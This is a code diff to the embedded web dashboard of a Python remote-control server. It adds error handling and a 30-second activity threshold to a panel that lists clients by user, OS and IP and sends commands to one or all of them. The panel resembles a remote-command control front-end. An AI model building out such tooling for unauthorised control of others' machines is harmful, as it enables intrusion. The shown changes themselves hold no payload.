@@ -1232,24 +1232,21 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 </div>
             </div>
             
-            <script>
+                <script>
                 let currentClientId = null;
                 let commandCounter = 0;
                 let allClients = [];
                 let currentOSTab = 'windows';
                 
                 function switchOSTab(osType) {
-                    // إخفاء جميع المحتويات
                     document.querySelectorAll('.os-content').forEach(content => {
                         content.classList.remove('active');
                     });
                     
-                    // إلغاء تفعيل جميع التبويبات
                     document.querySelectorAll('.os-tab').forEach(tab => {
                         tab.classList.remove('active');
                     });
                     
-                    // تفعيل التبويب والمحتوى المحدد
                     document.getElementById(osType + '-content').classList.add('active');
                     document.querySelector(`.os-tab:nth-child(${osType === 'windows' ? 1 : osType === 'linux' ? 2 : 3})`).classList.add('active');
                     
@@ -1269,33 +1266,58 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             return;
                         }
                         
-                        // ⚡ الكود المبسط والأفضل:
+                        // ⚡ الكود المعدل مع معالجة الأخطاء
                         list.innerHTML = sessions.map(client => {
-                            const lastSeen = new Date(client.last_seen).getTime();
-                            const now = Date.now();
-                            const timeDiff = (now - lastSeen) / 1000;
-                            
-                            // 🟢 بسيط: أقل من 30 ثانية = أخضر، أكثر = أحمر
-                            const isOnline = timeDiff < 30;
-                            
-                            const statusClass = isOnline ? 'online-status' : 'online-status offline';
-                            const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
-                            const statusColor = isOnline ? '#28a745' : '#dc3545';
-                            
-                            const isSelected = client.id === currentClientId;
-                            
-                            return `
-                                <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
-                                     onclick="selectClient('${client.id}')">
-                                    <div class="${statusClass}" title="${statusText}"></div>
-                                    <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
-                                    <small>User: ${client.user || 'Unknown'}</small><br>
-                                    <small>OS: ${client.os || 'Unknown'}</small><br>
-                                    <small>IP: ${client.ip}</small><br>
-                                    <small>Last: ${timeDiff.toFixed(0)}s ago</small>
-                                    <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
-                                </div>
-                            `;
+                            try {
+                                const lastSeen = new Date(client.last_seen).getTime();
+                                const now = Date.now();
+                                
+                                if (isNaN(lastSeen)) {
+                                    return `
+                                        <div class="session-item offline" onclick="selectClient('${client.id}')">
+                                            <div class="online-status offline" title="INVALID DATE"></div>
+                                            <strong style="color: #dc3545">${client.computer || client.id}</strong><br>
+                                            <small>User: ${client.user || 'Unknown'}</small><br>
+                                            <small>OS: ${client.os || 'Unknown'}</small><br>
+                                            <small>IP: ${client.ip}</small><br>
+                                            <small>Last: Invalid Date</small>
+                                            <small style="color: #dc3545; font-weight: bold;"> • OFFLINE</small>
+                                        </div>
+                                    `;
+                                }
+                                
+                                const timeDiff = (now - lastSeen) / 1000;
+                                
+                                // 🟢 تصنيف موحد: 30 ثانية للنشاط
+                                const isOnline = timeDiff < 30;
+                                
+                                const statusClass = isOnline ? 'online-status' : 'online-status offline';
+                                const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
+                                const statusColor = isOnline ? '#28a745' : '#dc3545';
+                                
+                                const isSelected = client.id === currentClientId;
+                                
+                                return `
+                                    <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
+                                         onclick="selectClient('${client.id}')">
+                                        <div class="${statusClass}" title="${statusText}"></div>
+                                        <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
+                                        <small>User: ${client.user || 'Unknown'}</small><br>
+                                        <small>OS: ${client.os || 'Unknown'}</small><br>
+                                        <small>IP: ${client.ip}</small><br>
+                                        <small>Last: ${timeDiff.toFixed(0)}s ago</small>
+                                        <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
+                                    </div>
+                                `;
+                            } catch (error) {
+                                return `
+                                    <div class="session-item offline" onclick="selectClient('${client.id}')">
+                                        <div class="online-status offline" title="ERROR"></div>
+                                        <strong style="color: #dc3545">${client.id}</strong><br>
+                                        <small>Error loading client data</small>
+                                    </div>
+                                `;
+                            }
                         }).join('');
                     } catch (error) {
                         console.error('Error loading sessions:', error);
@@ -1304,7 +1326,17 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
                 function updateSessionStats(sessions) {
                     const total = sessions.length;
-                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
+                    
+                    // ✅ التصحيح: استخدام 30 ثانية موحدة للنشاط
+                    const active = sessions.filter(client => {
+                        try {
+                            const lastSeen = new Date(client.last_seen).getTime();
+                            const now = Date.now();
+                            return (now - lastSeen) < 30000; // 30 ثانية
+                        } catch {
+                            return false;
+                        }
+                    }).length;
                     
                     document.getElementById('totalClients').textContent = total;
                     document.getElementById('activeClients').textContent = active;
@@ -1316,7 +1348,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     currentClientId = clientId;
                     loadSessions();
                     document.getElementById('currentClient').textContent = clientId;
-                    addToTerminal(`Selected client: ${clientId}\\n`);
+                    addToTerminal(`Selected client: ${clientId}\n`);
                 }
                 
                 function executeCommand(command) {
@@ -1330,7 +1362,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 async function executeSingleCommand(clientId, command) {
                     commandCounter++;
                     const startTime = Date.now();
-                    addToTerminal(` [${clientId}] ${command}\\n`);
+                    addToTerminal(` [${clientId}] ${command}\n`);
                     
                     try {
                         const response = await fetch('/execute', {
@@ -1341,13 +1373,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         
                         const data = await response.json();
                         if (data.success) {
-                            addToTerminal(`Command sent INSTANTLY\\n`);
+                            addToTerminal(`Command sent INSTANTLY\n`);
                             waitForResult(clientId, command, startTime);
                         } else {
-                            addToTerminal(`Error: ${data.error}\\n`);
+                            addToTerminal(`Error: ${data.error}\n`);
                         }
                     } catch (err) {
-                        addToTerminal(` Network error: ${err}\\n`);
+                        addToTerminal(` Network error: ${err}\n`);
                     }
                 }
                 
@@ -1357,13 +1389,23 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         return;
                     }
                     
-                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
+                    // ✅ التصحيح: استخدام 30 ثانية موحدة
+                    const activeClients = allClients.filter(client => {
+                        try {
+                            const lastSeen = new Date(client.last_seen).getTime();
+                            const now = Date.now();
+                            return (now - lastSeen) < 30000; // 30 ثانية
+                        } catch {
+                            return false;
+                        }
+                    });
+                    
                     if (activeClients.length === 0) {
                         alert('No active clients!');
                         return;
                     }
                     
-                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\\n`);
+                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\n`);
                     
                     activeClients.forEach(client => {
                         executeSingleCommand(client.id, command);
@@ -1396,13 +1438,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
                 function waitForResult(clientId, command, startTime) {
                     let attempts = 0;
-                    const maxAttempts = 100; // More attempts for instant response
+                    const maxAttempts = 100;
                     
                     const checkImmediately = async () => {
                         attempts++;
                         if (attempts > maxAttempts) {
                             const elapsed = (Date.now() - startTime);
-                            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
+                            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\n`);
                             return;
                         }
                         
@@ -1412,9 +1454,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             
                             if (data.result) {
                                 const responseTime = (Date.now() - startTime);
-                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
+                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\n${data.result}\n`);
                             } else if (data.pending) {
-                                setTimeout(checkImmediately, 10); //  10ms delay for instant checking
+                                setTimeout(checkImmediately, 10);
                             } else {
                                 setTimeout(checkImmediately, 10);
                             }
@@ -1444,7 +1486,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 // ⚡ Ultra-fast auto-refresh every 1 second
                 setInterval(loadSessions, 1000);
                 loadSessions();
-            </script>
+                </script>
         </body>
         </html>
         '''
